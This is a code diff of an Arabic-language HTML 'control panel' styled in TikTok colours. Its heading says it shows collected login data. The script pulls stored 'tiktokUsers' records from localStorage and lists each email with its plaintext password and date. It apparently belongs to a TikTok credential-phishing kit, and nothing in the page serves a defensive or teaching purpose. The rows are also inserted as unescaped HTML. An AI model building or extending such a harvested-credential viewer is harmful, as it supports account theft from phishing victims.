@@ -1,94 +1,71 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>لوحة التحكم - بيانات تيك توك</title>
-    <link rel="stylesheet" href="style.css" />
     <style>
-        .admin-container {
-            max-width: 900px;
-            margin: 40px auto;
-            padding: 20px;
-            background: #fff;
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-        }
-
-        table th, table td {
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            text-align: center;
-        }
-
-        table th {
-            background: #1a1a2e;
-            color: #fff;
-        }
-
-        .btn-back {
-            display: inline-block;
-            margin-top: 20px;
-            padding: 10px 30px;
-            background: #1a1a2e;
-            color: #fff;
-            border-radius: 30px;
-            text-decoration: none;
-        }
+        body { background: #121212; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; }
+        .container { max-width: 900px; margin: 0 auto; background: #1f1f1f; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px rgba(254,44,85,0.2); }
+        h2 { text-align: center; color: #fe2c55; border-bottom: 2px solid #333; padding-bottom: 15px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th { background: #fe2c55; color: #fff; padding: 12px; }
+        td { padding: 12px; border-bottom: 1px solid #333; text-align: center; }
+        .btn { display: inline-block; margin-top: 20px; padding: 12px 30px; background: #25f4ee; color: #000; border-radius: 50px; text-decoration: none; font-weight: bold; }
+        .no-data { text-align: center; color: #888; padding: 40px; }
     </style>
 </head>
 <body>
-    <div class="admin-container">
-        <h2>👑 بيانات تسجيل الدخول</h2>
-        <div id="usersTable"></div>
-        <a href="index.html" class="btn-back">🔙 العودة</a>
+<div class="container">
+    <h2>👑 بيانات تسجيل الدخول المجمعة</h2>
+    <div id="usersTable"></div>
+    <div style="text-align: center; margin-top: 20px;">
+        <a href="index.html" class="btn">🔙 العودة للرئيسية</a>
     </div>
+</div>
+<script>
+    function loadUsers() {
+        // 1. نجيب البيانات من Local Storage
+        const users = JSON.parse(localStorage.getItem('tiktokUsers')) || [];
+        const container = document.getElementById('usersTable');
 
-    <script>
-        function loadUsers() {
-            const users = JSON.parse(localStorage.getItem('tiktokUsers')) || [];
-            const container = document.getElementById('usersTable');
-
-            if (users.length === 0) {
-                container.innerHTML = '<p>❌ لا توجد بيانات حتى الآن.</p>';
-                return;
-            }
-
-            let html = `
-                <table>
-                    <thead>
-                        <tr>
-                            <th>#</th>
-                            <th>البريد الإلكتروني</th>
-                            <th>كلمة السر</th>
-                            <th>التاريخ</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-            `;
-
-            users.forEach((user, index) => {
-                html += `
-                    <tr>
-                        <td>${index + 1}</td>
-                        <td><strong>${user.email}</strong></td>
-                        <td>${user.password}</td>
-                        <td>${user.date}</td>
-                    </tr>
-                `;
-            });
-
-            html += '</tbody></table>';
-            container.innerHTML = html;
+        // 2. نتحقق إذا فيه بيانات ولا لأ
+        if (users.length === 0) {
+            container.innerHTML = '<p class="no-data">❌ لم يتم تسجيل أي بيانات حتى الآن.</p>';
+            return;
         }
 
-        window.onload = loadUsers;
-    </script>
+        // 3. نبني جدول يعرض البيانات
+        let html = `
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>📧 البريد الإلكتروني</th>
+                        <th>🔑 كلمة السر</th>
+                        <th>📅 التاريخ</th>
+                    </tr>
+                </thead>
+                <tbody>
+        `;
+
+        users.forEach((user, index) => {
+            html += `
+                <tr>
+                    <td>${index + 1}</td>
+                    <td><strong style="color: #25f4ee;">${user.email}</strong></td>
+                    <td style="color: #fe2c55;">${user.password}</td>
+                    <td>${user.date}</td>
+                </tr>
+            `;
+        });
+
+        html += '</tbody></table>';
+        container.innerHTML = html;
+    }
+
+    // 4. تشغيل الدالة تلقائياً عند فتح الصفحة
+    window.onload = loadUsers;
+</script>
 </body>
 </html>
